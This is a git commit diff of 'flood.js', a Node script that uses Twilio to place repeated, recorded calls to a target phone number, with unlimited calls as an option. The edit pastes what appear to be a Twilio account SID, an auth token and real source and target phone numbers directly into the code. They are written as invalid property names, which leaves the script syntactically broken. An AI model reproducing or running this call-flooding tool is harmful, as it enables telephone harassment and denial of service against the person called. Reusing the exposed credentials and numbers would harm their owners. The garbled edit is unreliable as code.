40cbb1dc18fb116662088f32915aa39e6710b090
980192 <102406091+980192@users.noreply.github.com>
2022-12-27 15:38:44 -0600

    Update flood.js

--- flood.js
+++ flood.js
@@ -1,14 +1,14 @@
 require('dotenv').config()
 
-const client = new require('twilio')(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN);
+const client = new require('twilio')(process.env.AC04e15bae6fcfde3492408b0a43cddb5e, process.env.079ca0d473641636406793dc0f97ed9b);
 
 // Set this to 0 for infinite
-const max = process.env.MAX_CALLS || 0;
+const max = process.env.MAX_CALLS || 3;
 
 // Don't change this
 let count = 1;
 
-console.info(`:: Flooding [ ${process.env.TARGET_PHONE_NUMBER} ] from [ ${process.env.SOURCE_PHONE_NUMBER} ]`);
+console.info(`:: Flooding [ ${process.env.+50230120984} ] from [ ${process.env.+19705174366} ]`);
 console.info(`:: Starting flood of ${max} calls`);
 
 // Call finish method when necessary
@@ -17,7 +17,7 @@ process.on('SIGINT', finished);
 
 function placeCall() {
 	return new Promise((resolve, reject) =>
-		client.calls.create({ record: true, url: process.env.TWIML_URL, to: process.env.TARGET_PHONE_NUMBER, from: process.env.SOURCE_PHONE_NUMBER, /* sendDigits: (true) ? '1' : null  */ })
+		client.calls.create({ record: true, url: process.env.TWIML_URL, to: process.env.50230120984, from: process.env.19705174366, /* sendDigits: (true) ? '1' : null  */ })
 			.then((call) => {
 				console.info(`:: Call ${count++} placed with ID [ ${call.sid.substring(0, 8) + '...' + call.sid.substring(call.sid.length - 8)} ]`);
 				count < max + 1 || max === 0 ? placeCall().then(resolve).catch(reject) : resolve();
